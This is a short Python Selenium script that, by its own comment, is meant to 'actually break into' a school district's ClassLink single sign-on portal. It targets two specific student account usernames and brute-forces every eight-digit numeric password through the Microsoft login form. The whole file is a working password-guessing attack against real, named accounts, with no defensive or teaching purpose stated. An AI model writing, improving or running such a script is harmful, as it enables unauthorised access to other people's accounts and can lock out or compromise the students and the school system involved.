#Program to actually break into ssoportal
#This program doesn't open a new window every time
#a password is input

#some amount of time.sleep is required between attempts
#to allow the page time to load

from selenium import webdriver
from selenium.webdriver.common.by import By
import time



url = "https://launchpad.classlink.com/ccisd?ru====="
#url2 = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e5e86b0-86b9-4bc2-85f6-3d137449f6a6&response_type=code%20id_token&redirect_uri=https%3A%2F%2Flaunchpad.classlink.com%2Fsigninwith%2Fwindowslive&response_mode=form_post&scope=openid%20https%3A%2F%2Fgraph.microsoft.com%2Fuser.read&nonce=fbe48cb0-ba55-11ee-8e9c-df2c798cbc9d&state=%7B%22os%22%3A%22Windows%22%2C%22os_version%22%3A%225.10.205-195.804.amzn2.x86_64%22%2C%22browser%22%3A%22Chrome%22%2C%22browser_version%22%3A%22120.0.0%22%2C%22resolution%22%3A%221366x768%22%2C%22ip_address%22%3A%2273.136.226.104%22%2C%22mode%22%3A%22login%22%7D"
username = []
usernames = ["100037971@ccisd.net", "100024596@ccisd.net"]
password = 0
drivers = []
for i in range(len(usernames)):
    drivers.append(webdriver.Chrome())

driverNumber = 0
for i in drivers:
    i.get(url)
    i.find_element(By.TAG_NAME, "button").click()
    time.sleep(5)
    i.find_element(By.ID, "i0116").send_keys(usernames[driverNumber])
    time.sleep(5)
    i.find_element(By.ID, "idSIButton9").click()
    time.sleep(5)
    i.find_element(By.NAME, "passwd").send_keys(str(password).zfill(8))
    time.sleep(5)
    i.find_element(By.ID, "idSIButton9").click()
    time.sleep(5)
    driverNumber+=1


while (password<=99999999):
    print(str(password).zfill(8))
    for i in drivers:
        i.find_element(By.NAME, "passwd").send_keys(str(password).zfill(8))
        i.find_element(By.ID, "idSIButton9").click()
    time.sleep(1)
    password+=1